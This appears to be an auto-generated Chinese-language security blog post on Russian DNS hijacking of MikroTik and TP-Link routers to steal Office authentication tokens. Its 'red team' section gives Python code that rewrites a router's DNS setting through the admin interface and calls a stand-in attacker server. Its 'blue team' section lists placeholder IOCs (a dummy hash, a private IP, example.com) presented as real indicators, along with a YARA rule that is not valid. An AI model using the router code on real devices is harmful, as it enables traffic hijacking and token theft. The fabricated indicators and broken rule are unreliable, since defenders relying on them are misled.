---
layout: post
title:  "Russia Hacked Routers to Steal Microsoft Office Tokens"
date:   2026-04-07 18:56:30 +0000
categories: [security]
severity: critical
---

# 🚨 解析俄羅斯駭客利用 DNS 劫持進行 Office 認證令牌竊取的技術細節

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: Info Leak (認證令牌竊取)
> * **關鍵技術**: DNS Hijacking, OAuth, Transport Layer Security (TLS)

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 駭客利用已知的漏洞修改 Internet 路由器的 DNS 設定，將 DNS 伺服器指向由駭客控制的伺服器。這樣，當用戶嘗試存取 Microsoft Office 時，會被導向駭客的伺服器，從而竊取認證令牌。
* **攻擊流程圖解**:
  1. 駭客掃描網路，尋找具有已知漏洞的路由器。
  2. 駭客利用漏洞修改路由器的 DNS 設定。
  3. 用戶嘗試存取 Microsoft Office。
  4. 路由器將用戶導向駭客的 DNS 伺服器。
  5. 駭客的 DNS 伺服器將用戶導向駭客的伺服器。
  6. 駭客竊取用戶的認證令牌。
* **受影響元件**: 主要是 older Mikrotik 和 TP-Link 路由器，尤其是那些沒有更新安全補丁的路由器。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 駭客需要有路由器的管理權限，並且路由器需要具有已知的漏洞。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 定義駭客的 DNS 伺服器
    dns_server = "駭客的 DNS 伺服器"
    
    # 定義駭客的伺服器
    attacker_server = "駭客的伺服器"
    
    # 修改路由器的 DNS 設定
    def modify_dns_settings(router_ip, router_password):
        # 使用路由器的管理介面修改 DNS 設定
        requests.post(f"http://{router_ip}/dns", auth=("admin", router_password), data={"dns_server": dns_server})
    
    # 導向用戶到駭客的伺服器
    def redirect_user(user_ip):
        # 使用 DNS 伺服器將用戶導向駭客的伺服器
        requests.get(f"http://{attacker_server}/redirect", params={"user_ip": user_ip})
    
    ```
* **繞過技術**: 駭客可以使用各種技術來繞過安全措施，例如使用 VPN 或代理伺服器來隱藏自己的 IP 地址。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | /etc/dns.conf |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule dns_hijacking {
        meta:
            description = "DNS 劫持攻擊"
            author = "藍隊"
        strings:
            $dns_server = "駭客的 DNS 伺服器"
        condition:
            $dns_server in (dns_server)
    }
    
    ```
* **緩解措施**: 更新路由器的安全補丁，修改 DNS 設定，使用安全的 DNS 伺服器，並監控網路流量以偵測可疑活動。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **DNS Hijacking (DNS 劫持)**: 想像一個駭客將你的 DNS 伺服器修改為自己的伺服器，從而將你的網路流量導向自己的伺服器。技術上是指駭客修改 DNS 設定，將用戶導向自己的伺服器。
* **OAuth (授權)**: 想像一個用戶授權應用程式存取自己的資料。技術上是指一個授權框架，允許用戶授權應用程式存取自己的資料，而不需要提供密碼。
* **Transport Layer Security (TLS)**: 想像一個安全的網路通訊協議，保護用戶的資料不被竊取。技術上是指一個安全的網路通訊協議，使用加密和憑證來保護用戶的資料。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://krebsonsecurity.com/2026/04/russia-hacked-routers-to-steal-microsoft-office-tokens/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


